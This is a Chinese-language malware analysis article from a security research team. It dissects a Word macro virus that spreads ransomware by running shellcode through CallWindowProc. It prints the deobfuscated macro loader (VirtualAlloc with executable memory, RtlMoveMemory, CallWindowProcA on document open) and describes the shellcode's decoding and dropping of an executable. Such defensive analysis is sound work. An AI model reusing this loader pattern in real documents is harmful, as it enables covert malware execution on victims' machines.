> 原文链接: https://www.anquanke.com//post/id/84433 


# CallWindowProc被宏病毒利用来执行Shellcode


                                阅读量   
                                **90651**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01b22a309614bc6919.png)](https://p5.ssl.qhimg.com/t01b22a309614bc6919.png)

## 简述

在反病毒领域，CallWindowProc执行Shellcode的方法早在2009年就有过讨论，近期360QEX引擎团队发现有宏病毒首次使用该方法，传播敲诈者勒索软件。

常见的宏病毒释放（下载） PE 文件，并执行的方法有：

数据来源步骤：PE 数据来源网络（downloader），或数据来源自身病毒文档（dropper）；

数据执行步骤：执行 PE 使用的方式 Application.Shell 或者 Wscript.shell 或者 Win32 CreateProcess。

而最新出现的样本与上述方式方法不同，由宏代码生成内存数据（为shellcode，并非直接的 PE 文件数据），并利用CallWindowProc来执行Shellcode，由Shellcode完成后续操作。

病毒样本：

MD5: cec4932779bb9f2a8fde43cbc280f0a9

SHA256: efd23d613e04d9450a89f43a0cfbbe0f716801998700c2e3f30d89b7194aff81

## 样本详细分析

源文档宏代码被混淆，并填充了垃圾代码，对宏代码进行简化后，如下，



```
Private Declare Function VirtualAlloc Lib "kernel32" Alias "VirtualAlloc" (ByVal lpaddr As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function CallWindowProcA Lib "user32" Alias "CallWindowProcA" (lpPrevWndFunc As Long, hWnd As Any, Msg As Any, wParam As Any, lParam As Any) As Long
Private Declare Sub RtlMoveMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
 
Private Sub Document_Open()
    synecdochic
End Sub
 
Sub synecdochic()
    data_raw = chalcedony.turnstile
    data_array_1 = boatswain.haircut(data_raw)
 
    #If Win64 Then
    Dim memory_base_address As LongPtr
    #Else
    Dim memory_base_address As Long
    #End If
    clethrionomys = 103 - 96 - 7
 
    hate = 42 - 58 + 4112
    memory_base_address = VirtualAlloc(clethrionomys, 4241, hate, &amp;H40)
 
    Dim document_full_name As String
    document_full_name = ActiveDocument.FullName
 
    Dim data_array_2() As Byte
    data_array_2 = data_array_1
 
    RtlMoveMemory ByVal memory_base_address, data_array_2(0), UBound(data_array_2) + 1
   
 
#If Win64 Then
memory_offset = 576
#ElseIf Win32 Then
memory_offset = 2214
#End If
 
 allmerciful = CallWindowProcA(ByVal memory_base_address + memory_offset, document_full_name, 0, 0, 0)
 
End Sub
```



分析该宏代码，得到的执行步骤有，

1、  获取窗体控件中预存的字符串数据；

2、  进行数据解码；

3、  申请内存空间，将数据以二进制形式复制到此内存空间；

4、  使用 CallWindowProc 执行 shellcode （二进制数据）。

[![](https://p5.ssl.qhimg.com/t0122b2a6f28804e4ac.png)](https://p5.ssl.qhimg.com/t0122b2a6f28804e4ac.png)

步骤 4 a) 使用 CallWindowProc 执行二进制数据

[![](https://p0.ssl.qhimg.com/t0104fc6279ce354952.png)](https://p0.ssl.qhimg.com/t0104fc6279ce354952.png)

步骤 4 b) 从Windbg 查看 CallWindowProc 调用

### Shellcode分析

二进制数据中同时存在32和64位的shellcode，32位的偏移于0x08A6，64位的偏移于0x0240处；

下面以32位版本为例分析：

首先，根据CallWindowProc调用shellcode时第二个参数为文档自身路径，Shellcode中打开文档，并在文档中寻找二进制标志串“50 4F 4C 41”，然后对标志后的0x142AC（图中硬编码）个字节进行第一次解码，解码算法是对每个字节先加3然后异或0x0D；

[![](https://p1.ssl.qhimg.com/t017a03a4c975183ca0.png)](https://p1.ssl.qhimg.com/t017a03a4c975183ca0.png)

第一次解码后的数据：

[![](https://p1.ssl.qhimg.com/t01fc1d12423e833924.png)](https://p1.ssl.qhimg.com/t01fc1d12423e833924.png)

Base 解码后的数据，从标志可以判断该二进制数据是一个PE：

[![](https://p1.ssl.qhimg.com/t01d192b3bfe57a7654.png)](https://p1.ssl.qhimg.com/t01d192b3bfe57a7654.png)

接着创建文件并写入解码后的数据，其文件路径为：

32位下："%TMP%gg771.exe"

64位下："%TMP%kt622.exe"

[![](https://p1.ssl.qhimg.com/t01c9a16d8d9e13c3c5.png)](https://p1.ssl.qhimg.com/t01c9a16d8d9e13c3c5.png)

文件释放完成后，调用API CreateProcessA创建进程：

[![](https://p4.ssl.qhimg.com/t0160955bc7054beba4.png)](https://p4.ssl.qhimg.com/t0160955bc7054beba4.png)

释放的PE文件MD5为： cc05867751b1de3cab89c046210faed4。

## 安全建议

鉴于近期宏病毒变种多携带敲诈者病毒通过垃圾邮件传播，更新频繁，影响恶劣，360安全专家建议用户打开杀毒软件实时防护，不随意点击垃圾邮件中的链接和附件。

## 参考：

1、[https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)

2、[http://www.freebuf.com/articles/web/11662.html](http://www.freebuf.com/articles/web/11662.html)

3、http://m.2cto.com/kf/200908/40688.html

4、[https://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx)
